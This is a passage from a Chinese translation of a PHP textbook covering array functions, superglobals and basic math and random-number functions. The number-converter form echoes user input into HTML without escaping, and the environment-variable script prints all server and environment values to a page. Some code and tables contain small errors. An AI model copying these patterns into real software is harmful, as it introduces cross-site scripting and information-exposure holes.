- array_map(function, array ...)为每个数组元素调用该函数，并返回一个数组，其中包含作为参数传递的数组或数组在经过该函数后的元素。

## 8.3 检查

假设你对函数的返回值不太了解，但怀疑它通常是一个数组，并需要从中获取一些信息。PHP为此提供了一些有趣的函数。

你已经了解count(Array)。该函数计算数组中的元素数量。如果将COUNT_RECURSIVE或1作为第二个参数指定，则会递归计算所有元素。这意味着count(Array, Mode)还会计算嵌套数组中的元素。假设有以下数组：

```php
$ibw_stockprices = array("1.1.2015" => 232, "1.1.2020" => 254);
$stockprices = array("IBW" => $ibw_stockprices);
```

如果你现在不带模式计算所有元素，例如：

```php
print count($stockprices);
```

则你得到1。另一方面，如果你递归操作，例如：

```php
print count($stockprices, 1);
```

则count()还会计算子数组的元素并返回3。

现在来看PHP中其他有趣的检查函数：

- sizeof()是count()的同义词。
- isset(Array)确定数组是否被定义。isset()对空数组也返回true。
- empty(Array)检查数组是否为空（true）或具有元素（false）。如果数组不存在，empty()返回true。
- is_array(Array)检查某物是否为数组。如果数组不存在，is_array()会返回一个警告。因此，你必须将此函数与isset()结合使用。
- in_array(Search element, Array, Strict)检查某个值是否存在于数组中。Search element可以是任何数据类型，包括另一个数组（自PHP 4.2.0起）。如果可选参数Strict设置为true，则Search element和查找值的数据类型必须匹配。注意：in_array()是两个不以数组开头，而是以搜索元素开头的数组函数之一！<sup>2</sup>

2 人们曾讨论过是否在未来的PHP版本中更改这两个函数in_array()和array_search()。但是，由于只有这两个函数，且对旧脚本的损害可能很大，因此未这么做。

> **注意**
> 此函数适用与比较运算符相同的规则。在字符串比较中，字符的ASCII位置决定性；也就是说，区分大小写。使用Strict时，是检查绝对相等或不相等。

## 8.4 转换

在庞大的数组辅助函数宇宙中，我们首先向你展示用于转换、拆分和连接数组的最重要函数。你还将学习如何将变量转换为数组以及反之。

> **注意**
> 大多数数组辅助函数也可以用普通的数组函数或多或少轻松地复制。但是，几乎没有人愿意做这项工作。

### 8.4.1 添加和删除

你可以把数组想象成一个堆栈。首先创建的元素是堆栈中的第一个元素；最后添加的元素是最后一个。

让我们来看看PHP为此提供的四个函数：

- array_pop(Array)删除数组的最后一个元素并返回它。如果没有元素，则函数返回零。
- array_push(Array, Value, Value ...)将值或多个值添加到数组末尾。你会自动获得最高的索引。数组的大小按指定的元素数量增加。返回元素的总数。
- array_shift(Array)删除数组的第一个元素，并更改所有其他元素的数值索引（关联索引不受影响）。在以下示例中，Saturday消失，Sunday的索引为0：

```php
$days = array("Saturday", "Sunday", "Monday", "Tuesday");
array_shift($days);
```

该函数返回被删除的元素，如果数组为空则返回零。
- array_unshift(Array, Value, Value ...)将新值添加到数组开头，并返回数组之后拥有的元素数量。




### 8.4.2 删除和替换

array_slice(array, start_index, length) 函数从数值数组中读取元素并将其作为数组返回。它从 start_index 开始，你可以选择性地指定 length——即从起始索引开始切片的元素数量。如果省略 length，则会剪切到数组末尾的所有元素。因此，以下示例返回一个包含两个元素的新数组（参见图 8.12）。

```php
<?php
$days = array("Saturday", "Sunday", "Monday", "Tuesday");
$new = array_slice($days, 1, 2);
print_r($new);
?>
```

清单 8.11 "array_slice()" ("array_slice.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_250_0.png)

图 8.12 新数组：原数组未更改！

> **注意**
> 你也可以为起始索引指定负值。在这种情况下，计数从数组末尾开始。以下行仅从数组中剪切 Monday：
> 
> $new = array_slice($days, -2, 1);
> 
> 但是，如果 length 具有负值，则切削在此位置停止，该位置从数组末尾开始计数。

对于关联数组，array_slice(Array, Length) 只有两个参数：数组和 length（即要从数组中切片的元素数量）。元素从数组开头移除并放入新数组。原数组同样不会更改。图 8.13 显示了以下指令的结果：

```php
$stockprices = array("IBM" => 232, "Miemens" => 34, "Rheinwerk" => 340);
$new = array_slice($stockprices, 2);
print_r($new);
```

![](img/ae7820c36e8f24c1623d26668b28e80e_251_0.png)

图 8.13 仅将最后一个元素添加到新数组中

> **提示**
> array_slice() 通常会调整所有数值索引。你也可以保留键。为此，请将 true 指定为第四个参数：
> 
> ```php
> $new = array_slice($days, 1, 2, true);
> ```

图 8.14 显示结果。

![](img/ae7820c36e8f24c1623d26668b28e80e_251_1.png)

图 8.14 两个值保留其索引

array_splice(array, start index, length, replacement) 的工作方式与其不带 p 的对照函数相同，只是新元素被插入而非被剪切的元素。然而，这意味着原数组会发生更改！array_splice() 返回被剪切的元素。

第四个参数 replacement 说明被剪切的元素被什么替换。它本身由一个数组组成，该数组的元素被插入到切削位置。

请参考以下简单示例。我们替换 $days 数组中间的“错误”星期几。请注意，此处输出的不是 array_splice() 的返回值，而是已更改的原始数组。图 8.15 显示了结果。

```php
<?php
$days = array("Saturday", "Sunday", "Monday", "Tuesday");
array_splice($days, 1, 2, array("Sunday", "Monday"));
print_r($days);
?>
```

清单 8.12 "array_splice()" ("array_splice.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_252_0.png)

图 8.15 原始数组已更改

> **提示**
> 如果不使用 replacement 使用 array_splice()，则可以用它从原始数组中剪切元素，而无需像 array_slice() 那样依赖新创建的数组。否则，起始索引和 length 也支持负值，与 array_slice() 一样。

### 8.4.3 连接

要连接两个或多个数组，请使用 array_merge(Array1, Array2 ...)。只需依次指定数组即可。它们随后按图 8.16 所示出现。

```php
<?php
$days = array("Saturday", "Sunday", "Monday", "Tuesday");
$stockprices = array("IBM" => 232, "Miemens" => 34, "Rheinwerk" => 340);
$new = array_merge($days, $stockprices);
print_r($new);
?>
```

清单 8.13 "array_merge()" ("array_merge.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_252_1.png)

图 8.16 数组已合并

连接遵循少数几条规则：

- 相同的关联索引意味着稍后添加的元素会覆盖先前的元素——例如：

```php
$stockprices = array("IBM" => 232, "Miemens" => 34, "Rheinwerk" => 340);
$stockprices2 = array("IBM" => 33, "Toyota" => 45);
$new = array_merge($stockprices, $stockprices2);
```

IBM 同时出现在两个数组中。IBM 在 $new 中只出现一次，值为 33。

- 相同的数值索引会导致索引编号调整，但两个元素都保留——例如：

```php
$days = array("Saturday", "Sunday", "Monday", "Tuesday");
$days2 = array("Wednesday", "Thursday", "Friday");
$new = array_merge($days, $days2);
```

数组 $new 包含所有星期几。Wednesday 的索引为 4，Thursday 的索引为 5，以此类推。

- 数值索引始终会重新编号。这意味着即使你只指定一个数组，元素也会按输入序列重新编号。如果你只想在不重新编号的情况下将数组追加在一起，也可以使用 + 将它们相加。

除了 array_merge()，PHP 中还有另外两个有趣的函数：

- array_merge_recursive(Array1, Array2 ...) 用于将多维数组合并在一起。该函数遍历所有数组并将它们追加在一起。
- array_combine(keys, values) 将两个数组合并为一个关联数组。第一个数组包含所有键，第二个数组包含关联值。

> **注意**
> 每个工作文件中都包含一个示例。文件名与方法名相同——即 array_merge_recursive.php 和 array_combine.php。

- 与 array_combine() 非常相似的是 list(Variable1, Variable2 ...) 语言结构。它将数组的单个值分配给多个变量。

```php
<?php
$stockprices = array(232, 34, 340);
list($IBM, $Miemens, $Rheinwerk) = $stockprices;
print "The price of Miemens is: " . $Miemens;
?>
```

清单 8.14 “list()” (“list.php”)

> **提示**
> 你也可以省略 list() 中不需要的值。然后如下所示：
> list(, $Miemens,) = $stockprices;

对于数据库输出等，你还可以将 list() 与循环一起使用：
while(list($x, $y) = sqlite_fetch_array($query)) { ... }

> **注意**
> PHP 7 对 list() 进行了更改：现在赋值顺序与变量声明的顺序一致。

### 8.4.4 变量和数组

如果要从数组元素生成变量或将变量转换为数组，可以手动完成，但自动化过程更方便。extract(Asso_Array) 函数将关联数组的所有元素转换为变量。索引成为变量名，值成为变量值。请参考以下简单示例；图 8.17 显示结果。

```php
<?php
$stockprices = array("IBM" => 232, "Miemens" => 34, "Rheinwerk" => 340);
extract($stockprices);
print "The course of Miemens is: " . $Miemens;
?>
```

清单 8.15 “extract()” (“extract.php”)

![](img/ae7820c36e8f24c1623d26668b28e80e_254_0.png)

图 8.17 变量生效

> **注意**
> 出于安全考虑，你不应简单地对之前通过 $_GET 或 $_POST 超全局数组获取的用户输入执行此操作。

默认情况下，extract(Array, Mode, Prefix) 会用同名的现有变量覆盖它们。但是，你可以选择性地选择处理现有变量的模式。模式有多个可用常量，如表 11 所示。第三个参数也是可选的，允许你在变量名前添加前缀。这样你可以清楚地识别新生成的变量，从而完全避免重叠。模式决定是否使用前缀。

| 模式 | 说明 |
|---|---|
| EXTR_OVERWRITE | 始终覆盖现有变量（默认设置）。 |
| EXTR_SKIP | 始终保留现有变量。 |
| EXTR_PREFIX_SAME | 如果两个变量匹配，数组中的新变量会收到前缀（第三个参数）。 |
| EXTR_PREFIX_ALL | 为所有变量提供前缀。 |
| EXTR_PREFIX_INVALID | 为索引为无效变量名的变量加前缀。这包括数值索引。 |
| EXTR_IF_EXISTS | 仅在变量已存在时设置变量。旧变量会被覆盖。 |
| EXTR_PREFIX_IF_EXISTS | 仅在变量已存在时设置变量。但是，对新变量使用前缀。旧变量保留。 |
| EXTR_REFS | 将变量作为引用提取。这意味着它们仍然引用数组。extract($stockprices, EXTR_REFS); $stockprices["Miemens"] = 45; |

表 8.1 "extract()" 的模式

compact(Variable, Variable ...) 函数是 extract() 的对应函数。该函数可以包含任意数量的字符串形式的变量名。变量名也可以位于一个或多个数组中。会检查所有这些变量名，看是否存在对应的变量。然后将其存储在关联数组中。

除了此函数，还有其他可以自动创建数组的函数：

- array_fill(start_index, number, value) 从 start_index 开始用 number 指定的元素数量填充数组。它们都将第三个参数作为值。
- range(Min, Max, Step) 创建一个从 Min 到 Max 的值数组。Min 和 Max 也可以互换。第三个参数定义中间步长。

### 8.4.5 解引用

解引用意味着你可以直接访问数组中的单个元素。即使数组刚刚创建，这也适用：

```php
echo ['Monday', 'Tuesday', 'Wednesday'][0];
```




在这种情况下，第一个元素（这里是周一）将被直接返回。这种解引用形式自 PHP 5.5 起存在。自 PHP 5.4 起，你可以直接访问由数组组成的函数的返回值。为此，只需在函数调用后直接添加带有数组索引的方括号即可。图 8.18 显示了结果。

```php
<?php
function add($start, $end, $step = 1) {
    $erg = array();
    if ($start < $end) {
        $j = 0;
        for ($i = $start; $i <= $end; $i += $step) {
            $j += $i;
            $result[] = $j;
        }
    }

    return $result;
}

echo add(2, 10, 2)[2];
?>
```

### 列表 8.16 解引用允许直接访问返回数组（"array_dereferencing.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_256_0.png)

### 图 8.18 中间步骤的返回直接从返回数组中进行

### 8.4.6 转换为参数

带有三个点 (...) 的参数在函数内用于接受多个参数。相反，它也可用于将数组拆分为多个函数参数。为此，只需在函数调用中将运算符写在数组前面即可。

```php
<?php
function add($a, $b, $c) {
    return $a + $b + $c;
}

$parameter = [1, 2, 3];

$result = add(...$parameter);
echo $result;
?>
```

### 列表 8.17 使用 ... 运算符传递数组（"array_unpack.php"）

前面脚本的结果是值 6。

> **注意**
> 该运算符只能用于相应调用的末尾。但是，你可以事先明确指定任意数量的参数。

自 PHP 8.1 起，数组的运算符 (...) 也可用于关联数组。以下示例解包两个数组，然后将它们重新组合为一个数组。

```php
<?php
$stockprices1 = array("IBW" => 232, "Miements" => 34, "Rheinwerk" => 340);
$stockprices2 = array("Rheinwerk" => 500, "Forsche" => 84);

$all_stockprices = [...$stockprices1, ...$stockprices2];
print_r($all_stockprices);
?>
```

### 列表 8.18 使用 ... 运算符传递数组（"array_unpack_string.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_257_0.png)

### 图 8.19 在结果数组中，如果键相同，则使用最后一个键

> **提示**
> 在功能上，此示例及参数的工作方式对应于 array_merge() 数组函数。

## 8.5 搜索和排序

本节总结了用于从数组中筛选元素或以某种方式重新排序数组元素的函数。

### 8.5.1 搜索

搜索时有一些有趣的函数。我们在这里介绍最重要的几个：

- array_key_exists(Index, Array) 函数用于确定索引是否存在于数组中，并将布尔值作为结果返回。
- array_search(Value, Array, Exactly) 在数组中搜索某个值并返回键或多个键。如果有多个，则返回一个数组。如果将可选的 Exactly 选项设置为 true，则搜索中还包括数据类型。注意：与 in_array() 类似，搜索词位于数组本身之前！
- array_keys(Array, Value, Exactly) 将数组的所有键作为数值数组返回。如果指定了值，则仅返回拥有该值的键。Exact 也是可选的，用于确定是否也检查数据类型。
- array_values(Array) 返回数组的值。生成的数组具有数值索引。先前存在的关联索引将丢失。

### 8.5.2 排序

对于数组排序，既有有用的函数，也有十年才用一次的函数。这里我们区别不大，既包含重要的，也包含一些不太重要的函数。

首先，以下是一些应用范围相当有限且仅允许少量设置的函数：

- array_flip(Array) 交换数组的索引和值，并将该数组作为返回值返回。如果有多个值，则只有最后一个值会保留，并将其键作为值。
- array_reverse(Array, Preserve) 反转数组的顺序。可选的第二个参数决定是否保留键（true）。默认值为 false。
- array_rand(Array, number) 返回数组元素的随机索引。如果指定了 number，则会得到一个包含多个随机索引的数组。
- shuffle(Array) 随机更改数组元素的顺序。返回值是一个布尔值，指示操作是否成功。

现在来看设置选项更多的排序函数。sort() 及类似函数的命名都非常合乎逻辑：

- 词根是 sort。
- 如果前面有 r，则表示逆序排序。
- 如果开头有 a，则表示排序，但保留索引和值的对应关系。
- 如果开头有 `k`，则按索引排序。这里也保留索引/值的对应关系。其他所有排序函数都按值排序。
- 对于其他所有函数，索引/值的对应关系都会改变。
- `u` 表示函数期望将排序函数作为参数。
- `nat` 表示尝试进行自然排序，即人类的排序方式。例如，数字 1、2 和 3 会排在 10、20 和 30 之前。为此使用了 Martin Pool 的算法（参见 http://s-prs.co/v602269）。

请看下面的简单示例。`sort()` 函数按值排序（因为未为 `key` 指定 `k`），并且会更改索引/值的对应关系。像其他所有函数一样，排序函数会更改原始数组。图 8.20 显示了结果。

```php
<?php
$days = array("Saturday", "Sunday", "Monday", "Tuesday");
sort($days);
print_r($days);
?>
```

### 列表 8.19 "sort()"（"sort.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_259_0.png)

### 图 8.20 字母顺序排序

## 8.6 超全局数组

_超全局数组_ 实际上非常容易描述。它们是（关联）数组，包含重要信息。例如，`$_SERVER` 包含 HTTP 标头、路径等；`$_POST` 和 `$_GET` 包含已发送表单的数据；`$_SESSION` 包含有关用户会话的信息。由于它们非常重要，我们将在此简要介绍，并针对常用的数组引用其详细说明所在的章节。

但在进入主题之前，关于超全局数组先说几句。PHP 4 发布时，在 PHP 中访问表单值非常简单。你可以直接使用 HTML 字段名作为变量。在 PHP 5.4 之前，可以将 `php.ini` 中的 `register_globals` 指令设置为 `On`。自 PHP 5.4 起，该选项已被永久移除。这是件好事，因为它是一个潜在的安全漏洞。³

³ 详情请参见第 13 章和第 32 章。

作为替代方案，也用于与表单无关的其他设置，存在始终遵循 $HTTP_*_VARS 模式的数组。星号代表数组的用途，例如 $HTTP_SERVER_VARS 用于服务器信息。但是，这些数组有些笨拙，因此在 PHP 4.1.0 中引入了超全局数组。它们现在是绝对标准，没有理由，而且自 PHP 5.4 起也无法回退到其他替代方案——特别是因为 PHP 5 中的 $HTTP_*_VARS 可以通过 php.ini 的 register_long_arrays 指令关闭。在 PHP 5.4 中，这个老辫子终于被剪掉了。你可以像普通数组一样搜索全局数组并遍历它们。结果见图 8.21。

```php
<?php
foreach ($_SERVER as $index => $value) {
    print $index . ": " . $value . "<br />";
}
?>
```

### 列表 8.20 读取 "$_SERVER"（"server.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_260_0.png)

### 图 8.21 "$_SERVER" 的所有条目

如所承诺，我们现在将简要介绍预定义变量。⁴ 以下内容的详细描述可参见 http://s-prs.co/v602270：

- $_GET 包含通过 GET 从表单附加到 URL 的值。第 13 章将详细介绍。
- $_POST 包含通过 POST 从表单发送的值。第 13 章也有相关介绍。
- $_COOKIE 包含有关 cookie 的信息。第 14 章可了解更多。
- $_REQUEST 包含前面项目符号中提到的三个变量的信息。第 14 章也有此变体。
- $_SESSION 提供会话变量的数据。第 15 章可了解更多。
- $_SERVER 包含有关 PHP 安装和 Web 服务器的信息。这包括脚本路径（PHP_SELF）以及身份验证信息。例如，后者将在第 33 章中介绍。
- $_ENV 提供 PHP 运行环境的信息。主要是 PHP 也注册的环境变量，具体取决于安装情况。
- $_FILES 包含有关上传文件的数据。第 13 章也有相关介绍。

> **注意**
> 超全局变量还包括用于保存全局变量的 $GLOBALS（参见第 6 章，第 6.1.2 节）。

$_SERVER 数组（有时也包括 $_ENV）特别有趣。你会在那里得到两种类型的信息：

- 客户端（浏览器）随 HTTP 请求发送到 Web 服务器的数据
- 关于服务器的数据

前者数据可在以 HTTP_ 开头的变量中找到。这包括 HTTP_USER_AGENT 条目，其中包含 Web 浏览器的标识字符串。⁵ 以下是一些示例值，从当前值开始，一直到经典旧值：

4 预定义变量在第 4 章中已提及。由于它们也属于数组，我们将在此再次简要介绍。
5 这是你在客户端通过 navigator.userAgent JavaScript 属性接收到的相同信息。





- Microsoft Edge (Windows)
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/132.0.0.0

- Chrome 132 (Windows)
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36

- Firefox 135 (Windows)
  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0

- Safari (macOS)
  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15

- Internet Explorer 6 (Windows)
  Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)

- Internet Explorer 10 (Windows)
  Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)

- Internet Explorer 11 (Windows)
  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko

- Netscape 7.1 (Windows)
  Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.4) Gecko/20030619 Netscape/7.1 (ax)

- Konqueror 4.9 (Linux)
  Mozilla/5.0 (X11; Linux) KHTML/4.9.1 (like Gecko) Konqueror/4.9

- Internet Explorer 5.23 (macOS)
  Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)

此信息可作为浏览器切换的基础。你还会在 $_SERVER 中找到其他有用的变量，例如 PHP_SELF，它包含当前 PHP 脚本的网址。

还有大量其他环境变量。但是，其中一些高度依赖于所使用的操作系统和 Web 服务器。为了演示这一点，以下小脚本输出 $_SERVER 和 $_ENV 的内容（另请参见图 8.22）。

```
<h1>Server variables</h1>
<table><tr><th>Name</th><th>Value</th></tr>

<?php
ksort($_SERVER);
foreach ($_SERVER as $name => $value) {
if (is_array($value)) {
printf("<tr><td>%s</td><td>%s</td></tr>",
               $name, implode(" ", $value));
        } else {
            printf("<tr><td>%s</td><td>%s</td></tr>",
                   $name, $value);
        }
    }
?>

```

```
</table>
<h1>Environment variables</h1>
<table><tr><th>Name</th><th>Value</th></tr>
```

```
<?php
ksort($_ENV);
foreach ($_ENV as $name => $value) {
    if (is_array($value)) {
        printf("<tr><td>%s</td><td>%s</td></tr>",
               $name, implode(" ", $value));
    } else {
        printf("<tr><td>%s</td><td>%s</td></tr>",
               $name, $value);
    }
}
?>

```

```
</table>
```

清单 8.21 输出所有环境变量（“environmentvariables.php”）

系统差异的后果显而易见：如果你查询一个冷门的环境变量（经验法则是，不以 `HTTP_` 或 `PHP_` 开头的变量），则还应在其他操作系统上测试代码。否则，迁移服务器时可能会遇到不愉快的意外。但是，更常见的环境变量中也存在差异；例如，`HTTP_UA_CPU` 和 `HTTP_UA_OS` 环境变量是 Internet Explorer 的特有功能，因此仅适用于内网使用。

剩下的唯一问题是 `$_SERVER` 和 `$_ENV` 之间有什么区别。理论上，`$_SERVER` 包含与 HTTP 请求和响应相关的变量，而 `$_ENV` 包含 PHP 运行所在系统的环境变量。然而，在实际中，这仅适用于 Linux；在 Windows 中，两者经常被混淆（如我们所见）。取决于 `php.ini` 中的配置，某些超全局变量可能不可访问，例如，不建议在生产环境中使用 `$_ENV`。提示：通常使用 `$_SERVER`。

![](img/ae7820c36e8f24c1623d26668b28e80e_264_0.png)

图 8.22 在带有 Apache 服务器的 Windows 下输出服务器和环境变量

**注意**
在 http://php.net/reserved.variables 上，你将找到受支持变量的列表。

# 第 9 章

# 数学和日期函数

数学计算和日期值处理在编程培训课程和书籍中经常被放在同一个话题下——如本书所示——或者至少关系密切。为什么？这两者都是不受欢迎的边缘任务。

你有多少次需要进行数学计算或处理日期？比你想象的更频繁。例如，生成图形时数学很重要。没有三角函数，复杂图形会非常令人不快。在 Web 上，日期值出现得更频繁：无论是由 PHP 自动生成的新闻条目的当前日期，还是倒数圣诞节的天数计数器。

在 PHP 存在的大量函数中，也有许多用于数学计算和日期值处理。在在线文档的函数参考中，甚至有专门的数学函数部分和日期函数部分。我们不想向你背诵所有函数；相反，我们将挑选最有趣的几个，并在实际中查看它们。

## 9.1 数学

“坐下，拿出你的练习本，到黑板前来，做数学题！”
许多人将数学与这种或类似的场景联系在一起。这里情况不会那么糟糕，我们保证！你将在以下部分找到最重要的主题。挑选你需要的内容。

### 9.1.1 基础

对于基本算术运算，PHP 与大多数编程和脚本语言一样，提供算术运算符（另请参见第 5 章）。然后，对于更复杂的计算，还提供了一些数学函数。例如，sqrt(number) 计算一个数的平方根，pow(base, power) 计算幂。

```
<?php
$a = 2;
$b = 3;
echo pow($a, $b);
?>
```

清单 9.1 使用 "pow()" 计算幂（“pow.php”）

你已经在心里算出幂了吗？PHP 说结果是 8。

> **注意**
> 
> 另外，还可以使用 `**` 运算符来计算幂。有关详细信息，请参阅第 5 章。

intdiv() 函数很实用。它执行整数除法。第一个参数是被除数；第二个参数是除数。返回值是除法的整数结果。因此，以下示例返回 4。

```
<?php
$a = 8;
$b = 2;
echo intdiv($a, $b);
?>
```

清单 9.2 使用 "intdiv()" 进行除法（“intdiv.php”）

如果除以 0，则会抛出类型为 DivisionByZeroError 的致命错误。

如果 PHP 提供的功能不够用，请编写自己的函数。如果你有多个函数，最好将它们保存在外部脚本文件中，并根据需要使用 include() 或 require() 加载。

一个有用函数的简单示例，考虑对任意数字求加法。

```
<?php
function add() {
    $numbers = func_get_args();
    $sum = 0;
    foreach ($numbers as $number) {
        $sum += $number;
    }
    return $sum;
}
echo add(2, 10, 66, 5, 23);
?>
```

清单 9.3 自定义数学函数（“custom_function.php”）

在前面的示例中，心算变得更加困难。结果是 106。

### 9.1.2 常量

某些数学常数使用频繁、难以计算，或两者皆是。因此，PHP 提供了一些预定义常数，我们在表 9.1 中列出。

| Constant | Description | Value |
|---|---|---|
| M_PI | 3.14159265358979323846 | π（读作 _pi_）指定圆的直径与周长之间的比率。它是 PHP 3 中已存在的唯一数学常数。 |
| M_PI_2 | 1.57079632679489661923 | 圆周率除以 2 |
| M_PI_4 | 0.78539816339744830962 | 圆周率除以 4 |
| M_1_PI | 0.31830988618379067154 | π 的倒数分数：1/π |
| M_2_PI | 0.63661977236758134308 | π 的两倍倒数分数：2/π |
| M_E | 2.7182818284590452354 | 欧拉数 _e_ |
| M_LOG2E | 1.4426950408889634074 | _e_ 以 2 为底的对数 |
| M_LOG10E | 0.43429448190325182765 | _e_ 以 10 为底的对数 |
| M_LN2 | 0.69314718055994530942 | 2 的自然对数 |
| M_LN10 | 2.30258509299404568402 | 10 的自然对数 |
| M_SQRT2 | 1.41421356237309504880 | 2 的平方根 |
| M_SQRT1_2 | 0.70710678118654752440 | 平方根的倒数分数：1/sqrt(2) |
| M_2_SQRTPI | 1.12837916709551257390 | 2 除以 π 的平方根：2/sqrt(π) |

表 9.1 PHP 中的数学常数

> **注意**
> 本表和在线文档给出这些数字的精度并非 PHP 提供的精度。PHP 4 默认仅提供 11 位小数，PHP 5 以及 PHP 7 及更高版本使用 13 位。

### 9.1.3 转换数字

人类通常使用基于 10 个数字的十进制数系统。但是，数字也可以用其他数系表示。最重要的是如下：

- 十六进制

在这种系统中，数字范围从 0 到 15。数字由字母表示：从表示 10 的 A 到表示 15 的 F。





### Binary

该系统仅使用 0 和 1。如果有 1，则对应的数字存在；如果有 0，则不存在。数字从右向左读取。最右边的第一位表示 1，其左边一位表示 2，再左边一位表示 4，再左边一位表示 8，以此类推。因此，二进制 101 转换为十进制 5。

### Octal

该数字系统基于数字 8。八进制数也从右向左读取。要将其转换为十进制数，将最右边的数字乘以 1，其左边一位乘以 8，再左边一位乘以 64，再左边一位乘以 512，以此类推。因此，八进制 143 转换为十进制 99。

> **注意**
>
> 自 PHP 8.1 起，八进制数的表示法有了新变化。它们仍然以前导 0 开头，之后加上小写字母 o：
>
> $octal = 0o143;

手动将十进制数字系统转换为这三种系统未免过于复杂。PHP 为此提供了三个转换函数：

- dechex(number)
- decbin(number)
- decoct(number)

> **注意**
>
> 转换函数返回字符串作为结果。PHP 中没有十六进制、二进制和八进制数的数据类型。反向转换函数同样使用字符串作为参数。

同样有三个函数用于反向转换。名称始终遵循相同的约定。转换所源自的数字系统位于前面：

- hexdec(String)
- bindec(String)
- octdec(String)

以下示例显示了一个简单的表单（见图 9.1），可用于将十进制数转换为其他三种数字系统。

```
<?php
if (isset($_POST["send"])) {
    $decimal = $_POST["decimal"];
    $hexa = dechex($decimal);
    $binary = decbin($decimal);
    $octal = decoct($decimal);
}
?>
```

```
<html>
<head>
<title>Converter</title>
</head>
<body>
<form method="POST">
<input type="text" name="decimal" value="<?=isset($decimal)?$decimal:''?>" />
The decimal number<br /><br />
<input type="text" name="hexa" value="<?=isset($hexa)?$hexa:''?>" />
in hexadecimal notation<br />
<input type="text" name="binary" value="<?=isset($binary)?$binary:''?>" />
in binary notation<br />
<input type="text" name="octal" value="<?=isset($octal)?$octal:''?>" />
in octal notation<br />
<input type="submit" name="send" value="Convert" /> </form>
</body>
</html>
```

清单 9.4 数字系统转换（“convert_numbers.php”）

![](img/ae7820c36e8f24c1623d26668b28e80e_269_0.png)

图 9.1 从十进制到其他数字系统的简单转换器

如果要进行更灵活的转换，可以使用 base_convert(number, source system, target system)。在此处，将要转换的数字作为字符串输入。对于源系统，基数跟随当前数字——即十进制为 10，二进制为 2，十六进制为 16，八进制为 8。对于目标系统，输入要转换至的系统的基数。两种系统的最大可能数为 36，因为这涵盖了 0 到 9 的所有数字以及 A 到 Z 的所有字母。

以下示例将二进制数转换为十六进制数。

```
<?php
$a = "1101";
echo base_convert($a, 2, 16);
?>
```

清单 9.5 转换所有数字系统（“base_convert.php”）

转换的结果是 d。在十进制系统中，该数字将是 ... 你知道吗？

### 9.1.4 随机数

如果你想在编程中与命运抗衡，随机数总是有用的。许多计算机游戏依赖随机性带来的惊喜元素，但随机性在严肃的应用中也很有意义。例如，随机生成的密码、随机选择的背景颜色或随机生成的广告横幅。

在较旧版本中，PHP 的随机函数有些令人困惑且经常更改。自版本 8.2 起，这里终于使用了一个新类。因此，我们花点时间仔细了解一下常规的和旧的改进的随机函数，以及新类。

### "rand()" 函数

使用 rand(Minimal, Maximal)，你可以获得介于最小值和最大值限制之间的整数随机值。

```
rand(1, 6)
```

因此返回 1 到 6 之间的随机数，且仅限整数！

> 注意
>
> 使用 srand(基值) 函数，可以为随机数设置一个基值。基值可以是当前日期，例如。

如果从 rand() 中省略限制，你将获得介于 0 和系统相关的上限之间的随机值。你可以使用 getrandmax() 读取此上限（见图 9.2）。这是最大可能的随机值。

```
<?php
echo "Random value: " . rand() . "<br />";
echo "Largest possible random value: " . getrandmax();
?>
```

清单 9.6 "rand()" 和 "getrandmax()"（“getrandmax.php”）

![](img/ae7820c36e8f24c1623d26668b28e80e_271_0.png)

图 9.2 随机值和系统上的最大可能值

### "mt_ ..."

mt_rand(Min, Max) 是 rand() 的较新对应函数。其特点就在前面的 mt 中：mt 代表 Mersenne Twister（梅森旋转算法），这是一种众所周知的随机算法，能提供更好的随机数。在这里，更好意味着随机数更可靠地随机，且算法运行更快。

> 注意
>
> 对于 mt_rand()，还有 mt_srand(base_value) 可用于为随机数设置基值。自 PHP 7.1 起，srand() 是 mt_srand() 的别名。还有一个返回上限的方法：mt_getrandmax()。如果你从 mt_rand() 中省略最大值，则需要此上限。

### "Random\Randomizer" 类

自 PHP 8.2 起，随机数终于有了面向对象的选项：Random\Randomizer 类。名称诚然合乎逻辑，但有些笨拙。然而，在功能上有许多可能性——例如：

- getInt(Min, Max) 返回整数作为结果。Min 和 Max 分别指定下限和上限。
- getFloat(Min, Max) 返回浮点数。仅 PHP 8.3 及以上版本可用。
- getBytes(length) 返回指定长度的随机字节字符串。
- shuffleArray(Array) 随机打乱数组的条目。
- pickArrayKeys(Array, Number) 随机选择指定数量的数组元素。

在以下示例中，Random\Randomizer 类掷出 1 到 6 之间的整数。

```
<?php
$random = new Random\Randomizer();

for($i = 0; $i < 100; $i++) {
    echo $random->getInt(1, 6) . "<br />";
}
?>
```

清单 9.7 “random” 对象生成随机数（“random.php”）

### 9.1.5 最大值、最小值和舍入

有时数字需要先进行修剪，或从多个数字中选择正确的数字。PHP 也为最重要的数学任务提供了现成的函数。

### 最大值和最小值

max(参数1, 参数2 ...) 和 min(参数1, 参数2 ...) 函数从任意数量的参数中确定最大值或最小值。请参考以下示例；结果见图 9.3。

```
<?php
$a = 10;
$b = 5;
$c = 7;

echo "Maximum: " . max($a, $b, $c) . "<br />";
echo "Minimum: " . min($a, $b, $c);
?>
```

清单 9.8 确定最大值和最小值（“maximal_minimal.php”）

![](img/ae7820c36e8f24c1623d26668b28e80e_272_0.png)

图 9.3 最大值和最小值

如果只指定一个参数，则它必须是一个数组。在这种情况下，max() 和 min() 返回数组中的最大值或最小值。

```
<?php
$numbers = array(10, 5, 7, 15, 12, 2, 8, 16, 1);
